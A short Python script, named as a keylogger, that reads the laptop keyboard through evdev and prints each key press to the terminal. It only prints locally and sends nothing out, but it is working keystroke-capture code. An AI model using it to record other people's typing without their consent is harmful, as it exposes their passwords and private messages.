import asyncio
from evdev import InputDevice, ecodes, categorize



async def keylog(dev):
    async for event in dev.async_read_loop():
        if event.type == ecodes.EV_KEY and event.value == 1:
            print(categorize(event))


if __name__ == "__main__":
    device = InputDevice('/dev/input/by-path/platform-i8042-serio-0-event-kbd')
    loop = asyncio.get_event_loop()
    loop.run_until_complete(keylog(device))
